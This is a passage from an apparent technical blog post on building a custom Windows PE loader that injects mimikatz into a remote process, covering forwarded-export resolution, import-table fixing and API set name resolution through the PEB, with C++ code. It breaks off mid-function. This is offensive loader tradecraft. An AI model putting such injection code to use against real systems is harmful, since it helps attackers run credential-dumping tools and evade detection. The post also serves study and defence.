<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="k">if</span> <span class="p">((</span><span class="n">UINT_PTR</span><span class="p">)</span><span class="n">addr</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="n">UINT_PTR</span><span class="p">)</span><span class="n">imageExportDirectory</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">UINT_PTR</span><span class="p">)</span><span class="n">addr</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">UINT_PTR</span><span class="p">)</span><span class="n">imageExportDirectory</span> <span class="o">+</span> <span class="n">exportDirectorySize</span><span class="p">)</span></code></pre></figure>

<p>Once our condition passed, let’s look at the content of the address returned.
<img src="assets/img/posts/20240124/fwlib.png" alt="Content of the address of the forwarded function" /></p>

<p>We can observe, that our mimikatz try to import the function <code class="language-plaintext highlighter-rouge">SystemFunction007</code> from the library <code class="language-plaintext highlighter-rouge">advapi32.dll</code>. The function appears to be a forwarded function since it passed our condition. When we look at the address from the function addresses array, we can observe that it contains forwarded library name and the forwarded function name with the format <code class="language-plaintext highlighter-rouge">FORWARDED_LIB.FORWARDED_NAME</code>.<br />
At this point, this is pretty straightforward, we need to copy the content of the forwarded name and the forwarded library name in the arguments <code class="language-plaintext highlighter-rouge">forwardedLib</code> and <code class="language-plaintext highlighter-rouge">forwardedName</code> that we have previously put in argument of our function.<br />
And finally we can call <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> on the forwarded library and our function recursively.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">DWORD</span> <span class="n">forwardSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">DWORD</span> <span class="n">forwardOffset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">CHAR</span> <span class="n">forwardName</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>

<span class="n">forwardSize</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">((</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">addr</span><span class="p">);</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">forwardName</span><span class="p">,</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">addr</span><span class="p">,</span> <span class="n">forwardSize</span><span class="p">);</span>

<span class="c1">// The forwardName has a format of DLLNAME.FunctionName so we split with '.'
</span>
<span class="k">for</span> <span class="p">(</span><span class="n">forwardOffset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">forwardOffset</span> <span class="o">&lt;</span> <span class="n">forwardSize</span><span class="p">;</span> <span class="n">forwardOffset</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">forwardName</span><span class="p">[</span><span class="n">forwardOffset</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'.'</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">forwardName</span><span class="p">[</span><span class="n">forwardOffset</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">forwardedLib</span><span class="p">)</span>
    <span class="c1">// +1 -&gt; null byte +4 -&gt; .dll 
</span>
    <span class="n">forwardedLib</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
<span class="k">else</span>
    <span class="n">forwardedLib</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">LocalReAlloc</span><span class="p">(</span><span class="n">forwardedLib</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">LMEM_MOVEABLE</span> <span class="o">|</span> <span class="n">LMEM_ZEROINIT</span><span class="p">);</span>

<span class="n">forwardedLib</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">)]</span> <span class="o">=</span> <span class="sc">'.'</span><span class="p">;</span>
<span class="n">forwardedLib</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'d'</span><span class="p">;</span>
<span class="n">forwardedLib</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'l'</span><span class="p">;</span>
<span class="n">forwardedLib</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">)</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'l'</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">forwardedName</span><span class="p">)</span>
    <span class="n">forwardedName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="n">forwardSize</span> <span class="o">-</span> <span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
<span class="k">else</span>
    <span class="n">forwardedName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">LocalReAlloc</span><span class="p">(</span><span class="n">forwardedName</span><span class="p">,</span> <span class="n">forwardSize</span> <span class="o">-</span> <span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">LMEM_MOVEABLE</span> <span class="o">|</span> <span class="n">LMEM_ZEROINIT</span><span class="p">);</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">forwardedLib</span><span class="p">,</span> <span class="n">forwardName</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">));</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">forwardedName</span><span class="p">,</span> <span class="n">forwardName</span> <span class="o">+</span> <span class="n">forwardOffset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">forwardSize</span> <span class="o">-</span> <span class="n">strlen</span><span class="p">(</span><span class="n">forwardName</span><span class="p">));</span>

<span class="k">return</span> <span class="nf">getAddrFunction</span><span class="p">(</span><span class="n">LoadLibraryA</span><span class="p">(</span><span class="n">forwardedLib</span><span class="p">),</span> <span class="n">forwardedName</span><span class="p">,</span> <span class="n">forwardedLib</span><span class="p">,</span> <span class="n">forwardedName</span><span class="p">);</span></code></pre></figure>

<p>Ok now, we can replace all our <code class="language-plaintext highlighter-rouge">GetProcAddress</code> by our own function.<br />
Our new function <code class="language-plaintext highlighter-rouge">loadImportTableLibs</code> will now looks like it.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="kt">bool</span> <span class="nf">loadImportTableLibs</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">pImage</span><span class="p">,</span> <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">ntHeaders</span><span class="p">,</span> <span class="n">LPPROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">offsetRdata</span><span class="p">)</span>
<span class="p">{</span>

    <span class="p">...</span>
                    <span class="n">PVOID</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">getAddrFunction</span><span class="p">(</span><span class="n">lib</span><span class="p">,</span> <span class="n">functionName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">forwardedLib</span><span class="p">,</span> <span class="n">forwardedName</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">forwardedLib</span> <span class="o">&amp;&amp;</span> <span class="n">forwardedName</span><span class="p">)</span>
                    <span class="p">{</span>
                        <span class="n">_dbg</span><span class="p">(</span><span class="s">"Forwarded function found: %s. Need to import lib %s</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">functionName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">forwardedLib</span><span class="p">);</span>
                        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">remoteLoadLibrary</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">forwardedLib</span><span class="p">))</span>
                            <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>

                    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span></code></pre></figure>

<p>And if we test it:
<img src="assets/img/posts/20240124/fwLibLoad.png" alt="Loading forwarded libraries" /><br />
We observe that our forwarded libraries are correctly loaded.<br />
Now let’s adapt our <code class="language-plaintext highlighter-rouge">fixImports</code> function.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="kt">bool</span> <span class="nf">fixImports</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">pImage</span><span class="p">,</span> <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">ntHeaders</span><span class="p">,</span> <span class="n">LPPROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">offsetRdata</span><span class="p">,</span> <span class="n">HANDLE</span> <span class="n">mod</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>
        <span class="n">MODULEENTRY32W</span> <span class="n">me32</span> <span class="o">=</span> <span class="n">getModuleEntry</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">moduleSearched</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">me32</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">PIMAGE_THUNK_DATA</span> <span class="n">thunk</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
            <span class="n">thunk</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_THUNK_DATA</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">pImage</span> <span class="o">+</span> <span class="n">importDescriptor</span><span class="o">-&gt;</span><span class="n">FirstThunk</span> <span class="o">-</span> <span class="n">offsetRdata</span><span class="p">);</span>

            <span class="k">while</span> <span class="p">(</span><span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">IMAGE_SNAP_BY_ORDINAL</span><span class="p">(</span><span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Ordinal</span><span class="p">))</span>
                <span class="p">{</span>
                    <span class="p">...</span>
                <span class="p">}</span>
                <span class="k">else</span>
                <span class="p">{</span>
                    <span class="n">PIMAGE_IMPORT_BY_NAME</span> <span class="n">functionName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_IMPORT_BY_NAME</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">pImage</span> <span class="o">+</span> <span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span> <span class="o">-</span> <span class="n">offsetRdata</span><span class="p">);</span>
                    <span class="n">PVOID</span> <span class="n">remoteAddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Function</span><span class="p">)</span> <span class="o">+</span> <span class="n">offsetRdata</span> <span class="o">-</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pImage</span> <span class="o">+</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">allocAddrOnTarget</span><span class="p">);</span>

                    <span class="n">PCHAR</span> <span class="n">forwardedName</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
                    <span class="n">PCHAR</span> <span class="n">forwardedLib</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>

                    <span class="n">PVOID</span> <span class="n">addrFunc</span> <span class="o">=</span> <span class="n">getAddrFunction</span><span class="p">(</span><span class="n">lib</span><span class="p">,</span> <span class="n">functionName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">forwardedLib</span><span class="p">,</span> <span class="n">forwardedName</span><span class="p">);</span>
                    <span class="n">DWORD</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                    <span class="n">ULONGLONG</span> <span class="n">addrFix</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                    <span class="c1">// if forwardedLib and forwardedName are allocated -&gt; it means we face a forwarded function
</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">forwardedLib</span> <span class="o">&amp;&amp;</span> <span class="n">forwardedName</span><span class="p">)</span>
                    <span class="p">{</span>
                        <span class="c1">// need to convert our PCHAR to PWSTR
</span>
                        <span class="n">PWSTR</span> <span class="n">forwardedLibWstr</span> <span class="o">=</span> <span class="n">strToWstr</span><span class="p">(</span><span class="n">forwardedLib</span><span class="p">);</span>
                        <span class="c1">// Find if the forwarded lib is loaded
</span>
                        <span class="n">MODULEENTRY32W</span> <span class="n">fwMe32</span> <span class="o">=</span> <span class="n">getModuleEntry</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">forwardedLibWstr</span><span class="p">);</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">fwMe32</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
                        <span class="p">{</span>
                            <span class="n">_err</span><span class="p">(</span><span class="s">"Failed to find import %ws</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">forwardedLibWstr</span><span class="p">);</span>
                            <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
                        <span class="p">}</span>
                        <span class="n">HMODULE</span> <span class="n">fwLib</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="n">forwardedLib</span><span class="p">);</span>
                        <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">addrFunc</span> <span class="o">-</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">fwLib</span><span class="p">;</span>
                        <span class="n">addrFix</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">fwMe32</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">);</span>
                        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[FORWARDED FUNCTION] %s is a forwarded function in %ws @ 0x%p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">functionName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">fwMe32</span><span class="p">.</span><span class="n">szModule</span><span class="p">,</span> <span class="n">fwMe32</span><span class="p">.</span><span class="n">modBaseAddr</span><span class="p">);</span>

                    <span class="p">}</span>
                    <span class="k">else</span>
                    <span class="p">{</span>
                        <span class="p">...</span>
                    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span></code></pre></figure>

<p>Now let’s try this code to see if we can load <code class="language-plaintext highlighter-rouge">mimikatz</code>.
<img src="assets/img/posts/20240124/apiSet.png" alt="Failed to resolve a forwarded function" /></p>

<p>Our code stoped because it could not find the import <code class="language-plaintext highlighter-rouge">api-ms-win-core-com-l1-1-0.dll</code>.<br />
If we look on top of our output to check which forwarded function we attempted to look for.<br />
<img src="assets/img/posts/20240124/fwApiSet.png" alt="Forwarded function failed" />.</p>

<p>We can see that the function we attempt to patch in the IAT is <code class="language-plaintext highlighter-rouge">CoInitializeEx</code> which is supposed to be forwarded to the library <code class="language-plaintext highlighter-rouge">api-ms-win-core-com-l1-1-0.dll</code>.<br />
Let’s look at it in a standalone code with a debugger.
<img src="assets/img/posts/20240124/apiSetResolve.png" alt="api-ms-win-core-com-l1-1-0.dll loaded" />
As we can see, we loaded the <code class="language-plaintext highlighter-rouge">api-ms-win-core-com-l1-1-0.dll</code> library, however the debugger indicates us that it is in reality the library <code class="language-plaintext highlighter-rouge">combase.dll</code>.<br />
It’s a mechanism created by Microsoft called the API Sets.</p>

<h2 id="handle-api-set">Handle API set</h2>

<h3 id="definition-of-api-sets">Definition of API Sets</h3>

<p>API sets, also known as API set namespaces, are a concept introduced in Windows operating systems to help manage the evolution of the Windows API (Application Programming Interface) and provide a layer of abstraction for developers. API sets play a role in versioning and maintaining compatibility between different versions of Windows.<br />
Windows implemented this in order to seperate functionalities through virtual names. It is also used to maintain compatibility across different Windows Versions.<br />
You can find more details about it: <a href="https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-apisets">Documentation Windows on API Sets</a></p>

<p>To sum up, API sets are names that are used as proxy for real DLLs. For our example <code class="language-plaintext highlighter-rouge">api-ms-win-core-com-l1-1-0.dll</code> is a proxy name for the dll <code class="language-plaintext highlighter-rouge">combase.dll</code>.</p>

<h3 id="how-to-resolve-api-set-names">How to resolve API set names</h3>

<p>When we look at the PEB structure referenced on <a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/index.htm">Geoff Chappell website</a>, we can observe that at the offset 0x68 we have a pointer to an attribute called <code class="language-plaintext highlighter-rouge">ApiSetMap</code>. This is where we can find the mapping of the API sets. However, when we look at the structure from <code class="language-plaintext highlighter-rouge">winternl.h</code>, we can see that the attribute is not referenced. By performing several tests and calculation, we can find that the <code class="language-plaintext highlighter-rouge">ApiSetMap</code> corresponds to the attribute: <code class="language-plaintext highlighter-rouge">(PPEB)-&gt;Reserved9[0]</code>.</p>

<p>Once we retrieved the pointer to the <code class="language-plaintext highlighter-rouge">ApiSetMap</code>, we will need to cast it in a structure called <code class="language-plaintext highlighter-rouge">API_SET_NAMESPACE</code>.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_API_SET_NAMESPACE</span>
<span class="p">{</span>
    <span class="n">ULONG</span> <span class="n">Version</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">Size</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">Count</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">EntryOffset</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">HashOffset</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">HashFactor</span><span class="p">;</span>
<span class="p">}</span> <span class="n">API_SET_NAMESPACE</span><span class="p">,</span> <span class="o">*</span><span class="n">PAPI_SET_NAMESPACE</span><span class="p">;</span></code></pre></figure>

<p>With this structure we can calculate the address of the first namespace entry which is a <code class="language-plaintext highlighter-rouge">API_SET_NAMESPACE_ENTRY</code>.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_API_SET_NAMESPACE_ENTRY</span>
<span class="p">{</span>
    <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">NameOffset</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">NameLength</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">HashedLength</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">ValueOffset</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">ValueCount</span><span class="p">;</span>
<span class="p">}</span> <span class="n">API_SET_NAMESPACE_ENTRY</span><span class="p">,</span> <span class="o">*</span><span class="n">PAPI_SET_NAMESPACE_ENTRY</span><span class="p">;</span>

<span class="c1">// Retrieve PEB
</span>
<span class="n">PPEB</span> <span class="n">peb</span> <span class="o">=</span> <span class="p">(</span><span class="n">PPEB</span><span class="p">)</span><span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
<span class="c1">// Get API SET MAP
</span>
<span class="n">PAPI_SET_NAMESPACE</span> <span class="n">apiMap</span> <span class="o">=</span> <span class="p">(</span><span class="n">PAPI_SET_NAMESPACE</span><span class="p">)</span><span class="n">peb</span><span class="o">-&gt;</span><span class="n">Reserved9</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="c1">// Get First Entry of API Set Map
</span>
<span class="n">PAPI_SET_NAMESPACE_ENTRY</span> <span class="n">ApiMapEntry</span> <span class="o">=</span> <span class="n">PAPI_SET_NAMESPACE_ENTRY</span><span class="p">(</span><span class="n">apiMap</span><span class="o">-&gt;</span><span class="n">EntryOffset</span> <span class="o">+</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">apiMap</span><span class="p">);</span></code></pre></figure>

<p>Each namespace entry can have multiple entries. (Yes, a single api set can be a virtual name towards multiple DLLs). Each entry has the type <code class="language-plaintext highlighter-rouge">PAPI_SET_VALUE_ENTRY</code> in which we can find the corresponding dll name.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_API_SET_VALUE_ENTRY</span> <span class="p">{</span>
    <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">NameOffset</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">NameLength</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">ValueOffset</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">ValueLength</span><span class="p">;</span>
<span class="p">}</span> <span class="n">API_SET_VALUE_ENTRY</span><span class="p">,</span> <span class="o">*</span> <span class="n">PAPI_SET_VALUE_ENTRY</span><span class="p">;</span></code></pre></figure>

<p>When we wrap up everything.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">resolveAPISet</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">PPEB</span> <span class="n">peb</span> <span class="o">=</span> <span class="p">(</span><span class="n">PPEB</span><span class="p">)</span><span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
    <span class="n">PAPI_SET_NAMESPACE</span> <span class="n">apiMap</span> <span class="o">=</span> <span class="p">(</span><span class="n">PAPI_SET_NAMESPACE</span><span class="p">)</span><span class="n">peb</span><span class="o">-&gt;</span><span class="n">Reserved9</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">PWSTR</span> <span class="n">ApiStrName</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
    <span class="n">PAPI_SET_NAMESPACE_ENTRY</span> <span class="n">ApiMapEntry</span> <span class="o">=</span> <span class="n">PAPI_SET_NAMESPACE_ENTRY</span><span class="p">(</span><span class="n">apiMap</span><span class="o">-&gt;</span><span class="n">EntryOffset</span> <span class="o">+</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">apiMap</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">apiMap</span><span class="o">-&gt;</span><span class="n">Count</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">ApiStrName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWSTR</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">apiMap</span> <span class="o">+</span> <span class="n">ApiMapEntry</span><span class="o">-&gt;</span><span class="n">NameOffset</span><span class="p">);</span>
        <span class="n">PAPI_SET_VALUE_ENTRY</span> <span class="n">ApiValueEntry</span> <span class="o">=</span> <span class="p">(</span><span class="n">PAPI_SET_VALUE_ENTRY</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">apiMap</span> <span class="o">+</span> <span class="n">ApiMapEntry</span><span class="o">-&gt;</span><span class="n">ValueOffset</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"API Set %ws -&gt; "</span><span class="p">,</span> <span class="n">ApiStrName</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">ApiMapEntry</span><span class="o">-&gt;</span><span class="n">ValueCount</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">WCHAR</span> <span class="n">apiRes</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
            <span class="n">memcpy</span><span class="p">(</span><span class="n">apiRes</span><span class="p">,</span> <span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">apiMap</span> <span class="o">+</span> <span class="n">ApiValueEntry</span><span class="o">-&gt;</span><span class="n">ValueOffset</span><span class="p">),</span> <span class="n">ApiValueEntry</span><span class="o">-&gt;</span><span class="n">ValueLength</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">==</span> <span class="n">ApiMapEntry</span><span class="o">-&gt;</span><span class="n">ValueCount</span><span class="p">)</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"%ws "</span><span class="p">,</span> <span class="n">apiRes</span><span class="p">);</span>
            <span class="k">else</span>
                <span class="nf">printf</span><span class="p">(</span><span class="s">"%ws, "</span><span class="p">,</span> <span class="n">apiRes</span><span class="p">);</span>
            <span class="n">ApiValueEntry</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>

        <span class="n">ApiMapEntry</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p><img src="assets/img/posts/20240124/ApiResolution.png" alt="API Set resolution" /></p>

<p>You can find the structures in more details on <a href="https://ntdoc.m417z.com">m417z documentation of Windows Native API</a>.</p>

<p>When we look at API set map, we found out that most of the API set names have only one corresponding DLL. After performing multiple tests, I realised that the edge case where we need to resolve the second DLL instead of the first was very rare. Therefore, to lighten our code we will take the first entry of the API set. However, keep in mind that you can encounter this edge case.</p>

<p>Also the last digit of the api set can differ from the one we are looking for. However, it is still the good resolution. For example: <code class="language-plaintext highlighter-rouge">mimikatz</code> has a forwarded function to the API Set name: <code class="language-plaintext highlighter-rouge">api-ms-win-core-com-l1-1-0</code>. However, when you enumerate your API Set Map, you will find out that the only similar API Set name is <code class="language-plaintext highlighter-rouge">api-ms-win-core-com-l1-1-3</code>. You will also notice that they resolve to the same DLL name. Therefore, when you resolve an API Set, it is advice to compare the name without the last digit.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">resolveAPISet</span><span class="p">(</span><span class="n">PWCHAR</span> <span class="n">apiToResolve</span><span class="p">,</span> <span class="n">PWCHAR</span><span class="o">&amp;</span> <span class="n">apiResolved</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// Retrieve PEB
</span>
    <span class="n">PPEB</span> <span class="n">peb</span> <span class="o">=</span> <span class="p">(</span><span class="n">PPEB</span><span class="p">)</span><span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
    <span class="c1">// Get API SET MAP
</span>
    <span class="n">PAPI_SET_NAMESPACE</span> <span class="n">apiMap</span> <span class="o">=</span> <span class="p">(</span><span class="n">PAPI_SET_NAMESPACE</span><span class="p">)</span><span class="n">peb</span><span class="o">-&gt;</span><span class="n">Reserved9</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">PWSTR</span> <span class="n">ApiStrName</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
    <span class="c1">// Get First Entry of API Set Map
</span>
    <span class="n">PAPI_SET_NAMESPACE_ENTRY</span> <span class="n">ApiMapEntry</span> <span class="o">=</span> <span class="n">PAPI_SET_NAMESPACE_ENTRY</span><span class="p">(</span><span class="n">apiMap</span><span class="o">-&gt;</span><span class="n">EntryOffset</span> <span class="o">+</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">apiMap</span><span class="p">);</span>
